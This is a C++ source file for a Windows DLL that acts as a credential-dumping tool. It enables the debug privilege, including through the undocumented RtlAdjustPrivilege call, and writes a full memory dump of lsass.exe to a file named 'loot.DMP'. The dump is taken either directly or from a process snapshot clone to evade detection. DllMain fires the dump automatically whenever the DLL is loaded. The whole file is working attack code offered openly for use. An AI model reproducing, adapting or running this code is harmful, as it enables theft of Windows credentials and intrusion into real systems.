#include "pch.h"

#define SE_DEBUG_PRIVILEGE 20

// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

const LPCWSTR dmpPath = L"loot.DMP";

// get Process ID by process name
DWORD getPID(LPCWSTR procName = L"lsass.exe") {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

// minidump lsass process memory to file
BOOL miniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL cDump = MiniDumpWriteDump(hProcess,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);

	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// callback routine for MiniDumpWriteDump to tell it to read snapshot data instead of process handle
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
  __in     PVOID CallbackParam,
  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
        case 16: // IsProcessSnapshotCallback
            CallbackOutput->Status = S_FALSE;
            break;
    }
    return TRUE;
}

// ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
// capture process snapshot then minidump lsass from snapshot to file
BOOL pssMiniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
                            | PSS_CAPTURE_HANDLES
                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TRACE
                            | PSS_CAPTURE_THREADS
                            | PSS_CAPTURE_THREAD_CONTEXT
                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
                            | PSS_CREATE_BREAKAWAY
                            | PSS_CREATE_BREAKAWAY_OPTIONAL
                            | PSS_CREATE_USE_VM_ALLOCATIONS
                            | PSS_CREATE_RELEASE_SECTION;
	HPSS SnapshotHandle;
	// capture snapshot of lsass process
	DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
	if (dwResultCode != ERROR_SUCCESS) return false;


	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
	CallbackInfo.CallbackParam = NULL;
	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);

	PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
// win32 method of enabling access token privileges
BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    BOOL bRet=FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        //  Enable the privilege or disable all privileges.
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            //  Check to see if you have proper access.
            //  You may get "ERROR_NOT_ALL_ASSIGNED".
            bRet=(GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

// set SEDEBUGPRIVILEGE in current process
BOOL setSEDebug() {
	HANDLE hProcess=GetCurrentProcess();
	HANDLE hToken;
	BOOL bRet = FALSE;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		bRet = setPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}
	else {
		return bRet;
	}
	CloseHandle(hProcess);

	return bRet;
}

// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
// returns previous debug privilege state
BOOLEAN setRtlSEDebug() {
	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
	return bPreviousPrivilegeStatus;
}


// ref: https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80
// check if process is UAC elevated (does not check if System integrity or runas administrator)
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		setRtlSEDebug();
		pssMiniDumpLoot();
    case DLL_THREAD_ATTACH:
		setRtlSEDebug();
		pssMiniDumpLoot();
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

